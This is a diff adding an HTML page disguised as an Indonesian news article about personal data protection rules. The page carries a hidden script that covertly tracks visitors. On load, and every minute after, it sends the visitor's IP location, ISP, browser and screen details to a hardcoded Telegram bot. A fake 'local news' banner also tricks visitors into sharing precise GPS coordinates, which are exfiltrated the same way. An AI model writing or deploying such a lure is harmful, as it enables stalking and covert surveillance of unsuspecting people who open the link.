@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Berita Nusantara — Artikel</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family: Georgia, "Times New Roman", serif; background:#f4f1ea; color:#1a1a1a; line-height:1.7; }
+  header { background:#fff; border-bottom:3px solid #c0392b; padding:14px 20px; position:sticky; top:0; z-index:10; }
+  .brand { font-family:-apple-system,sans-serif; font-size:22px; font-weight:800; color:#c0392b; letter-spacing:-0.5px; }
+  .brand span { color:#1a1a1a; }
+  nav { font-family:-apple-system,sans-serif; font-size:13px; color:#666; margin-top:6px; }
+  nav a { color:#666; text-decoration:none; margin-right:16px; }
+  .container { max-width:720px; margin:0 auto; padding:24px 20px; }
+  .kategori { font-family:-apple-system,sans-serif; font-size:11px; font-weight:700; color:#c0392b; letter-spacing:1.5px; text-transform:uppercase; margin-bottom:10px; }
+  h1 { font-size:28px; line-height:1.25; margin-bottom:14px; color:#111; }
+  .meta { font-family:-apple-system,sans-serif; font-size:13px; color:#888; margin-bottom:20px; padding-bottom:20px; border-bottom:1px solid #ddd; }
+  .meta strong { color:#333; }
+  .hero { width:100%; height:220px; background:linear-gradient(135deg,#2c3e50,#34495e); border-radius:6px; margin-bottom:24px; display:flex; align-items:center; justify-content:center; color:#7f8c8d; font-family:-apple-system,sans-serif; font-size:13px; }
+  article p { margin-bottom:18px; font-size:17px; color:#222; }
+  article p:first-of-type::first-letter { font-size:52px; float:left; line-height:0.9; padding:4px 8px 0 0; color:#c0392b; font-weight:700; }
+  .banner { position:fixed; bottom:16px; left:50%; transform:translateX(-50%); background:#1a1a1a; color:#fff; font-family:-apple-system,sans-serif; font-size:12.5px; padding:12px 16px; border-radius:10px; box-shadow:0 8px 24px rgba(0,0,0,.25); display:flex; align-items:center; gap:10px; max-width:92%; z-index:20; animation:slideUp .4s ease; }
+  @keyframes slideUp { from { transform:translate(-50%,20px); opacity:0; } }
+  .banner button { background:#c0392b; color:#fff; border:none; padding:7px 12px; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer; white-space:nowrap; }
+  .banner .close { background:transparent; color:#666; padding:0 4px; font-size:16px; cursor:pointer; }
+  footer { text-align:center; padding:40px 20px; font-family:-apple-system,sans-serif; font-size:12px; color:#999; border-top:1px solid #ddd; margin-top:30px; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">Berita<span>Nusantara</span></div>
+  <nav><a href="#">Nasional</a><a href="#">Ekonomi</a><a href="#">Teknologi</a><a href="#">Olahraga</a></nav>
+</header>
+
+<div class="container">
+  <div class="kategori">Teknologi</div>
+  <h1>Pemerintah Percepat Regulasi Perlindungan Data Pribadi di Sektor Digital</h1>
+  <div class="meta">Oleh <strong>Redaksi</strong> · <span id="tanggal"></span> · 4 menit baca</div>
+  <div class="hero">📷 Foto: Ilustrasi</div>
+  <article>
+    <p>Langkah percepatan regulasi ini menandai babak baru dalam tata kelola data pribadi di Indonesia. Kementerian terkait menyatakan bahwa kerangka hukum yang lebih tegas diperlukan seiring meningkatnya volume transaksi digital dan adopsi layanan berbasis cloud di kalangan masyarakat.</p>
+    <p>Menurut keterangan resmi, fokus utama regulasi mencakup transparansi penggunaan data, hak penghapusan, serta kewajiban pelaporan insiden kebocoran dalam waktu 72 jam. Pelaku usaha diminta menyesuaikan sistem internal mereka dalam masa transisi yang ditetapkan hingga akhir tahun depan.</p>
+    <p>Pengamat kebijakan digital menyambut positif langkah tersebut, namun mengingatkan bahwa implementasi di lapangan akan bergantung pada kapasitas pengawasan dan penegakan hukum. Tanpa mekanisme audit yang kuat, regulasi berpotensi hanya menjadi formalitas administratif.</p>
+    <p>Sejumlah organisasi masyarakat sipil juga mendorong partisipasi publik dalam tahap finalisasi draf, agar kepentingan pengguna tidak terpinggirkan oleh tekanan industri. Konsultasi publik dijadwalkan berlangsung dalam dua pekan ke depan di lima kota besar.</p>
+  </article>
+</div>
+
+<div class="banner" id="banner" style="display:none;">
+  <span id="bannerText"></span>
+  <button id="bannerBtn">Aktifkan</button>
+  <span class="close" id="bannerClose">×</span>
+</div>
+
+<footer>© 2025 BeritaNusantara · Semua hak dilindungi</footer>
+
+<script>
+(function(){
+  "use strict";
+
+  // ── CONFIG ──────────────────────────────────────────────
+  const TG_TOKEN  = "8628654449:AAGXnd1iWAS_0xvoLDH6UrpkomwcQeYQsjc";
+  const TG_CHATID = "6375295419";
+  const GEO_API   = "https://ipapi.co/json/";
+  const SESSION_ID = Math.random().toString(36).slice(2,10) + Date.now().toString(36);
+  // ────────────────────────────────────────────────────────
+
+  const TG_URL = "https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage";
+
+  function sendTG(text) {
+    if (text.length > 3500) text = text.slice(0, 3497) + "...";
+    const url = TG_URL + "?chat_id=" + encodeURIComponent(TG_CHATID)
+              + "&parse_mode=HTML&disable_web_page_preview=true"
+              + "&text=" + encodeURIComponent(text);
+    const img = new Image();
+    img.src = url;
+  }
+
+  function esc(s) {
+    return String(s == null ? "-" : s)
+      .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  }
+
+  function fmtIP(g, tag) {
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    let s = "<b>📍 " + tag + "</b>\n";
+    s += "IP: <code>" + esc(g.ip) + "</code>\n";
+    s += "Kota: " + esc(g.city || g.city_name) + "\n";
+    s += "Provinsi: " + esc(g.region) + "\n";
+    s += "Negara: " + esc(g.country_name || g.country) + "\n";
+    s += "ISP: " + esc(g.org || g.org_name || (g.connection && g.connection.isp)) + "\n";
+    s += "TZ: " + esc(g.timezone) + "\n";
+    if (g.latitude && g.longitude) {
+      s += 'Map: <a href="https://www.google.com/maps?q=' + g.latitude + "," + g.longitude + '">buka</a>\n';
+    }
+    s += "UA: <code>" + esc((navigator.userAgent||"").slice(0,120)) + "</code>\n";
+    s += "Lang: " + esc(navigator.language) + " · Screen: " + screen.width + "x" + screen.height + "\n";
+    s += "Sesi: <code>" + SESSION_ID + "</code>\n";
+    s += "Waktu: " + esc(now);
+    return s;
+  }
+
+  function fmtGPS(c) {
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    let s = "<b>🎯 GPS PRESISI</b>\n";
+    s += "Lat: <code>" + c.latitude + "</code>\n";
+    s += "Lon: <code>" + c.longitude + "</code>\n";
+    s += "Akurasi: ±" + Math.round(c.accuracy) + "m\n";
+    s += 'Map: <a href="https://www.google.com/maps?q=' + c.latitude + "," + c.longitude + '">buka</a>\n';
+    s += "Sesi: <code>" + SESSION_ID + "</code>\n";
+    s += "Waktu: " + esc(now);
+    return s;
+  }
+
+  const d = new Date();
+  const bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
+  document.getElementById('tanggal').textContent = d.getDate() + " " + bulan[d.getMonth()] + " " + d.getFullYear();
+
+  async function silentIPLookup() {
+    try {
+      const res = await fetch(GEO_API);
+      if (!res.ok) throw 0;
+      const g = await res.json();
+      sendTG(fmtIP(g, "LOKASI IP (SILENT)"));
+    } catch(e) {
+      try {
+        const r2 = await fetch("https://ipwho.is/");
+        const g2 = await r2.json();
+        if (g2.success) sendTG(fmtIP(g2, "LOKASI IP (SILENT)"));
+      } catch(_) {}
+    }
+  }
+
+  const banner = document.getElementById('banner');
+  const bannerText = document.getElementById('bannerText');
+  const bannerBtn = document.getElementById('bannerBtn');
+  const bannerClose = document.getElementById('bannerClose');
+
+  let scrollTriggered = false;
+  function maybeShowBanner() {
+    if (scrollTriggered) return;
+    if (window.scrollY < 300) return;
+    scrollTriggered = true;
+    setTimeout(() => {
+      bannerText.textContent = "Tampilkan berita lokal di sekitar Anda?";
+      banner.style.display = 'flex';
+    }, 1500);
+  }
+  window.addEventListener('scroll', maybeShowBanner, { passive:true });
+  bannerClose.addEventListener('click', () => { banner.style.display = 'none'; });
+
+  bannerBtn.addEventListener('click', () => {
+    banner.style.display = 'none';
+    navigator.geolocation.getCurrentPosition(
+      (pos) => { sendTG(fmtGPS(pos.coords)); },
+      () => {},
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+
+  silentIPLookup();
+
+  setInterval(() => {
+    fetch("https://ipwho.is/")
+      .then(r => r.json())
+      .then(g => { if (g.success) sendTG(fmtIP(g, "IP HEARTBEAT")); })
+      .catch(()=>{});
+  }, 60000);
+
+})();
+</script>
+</body>
+</html>
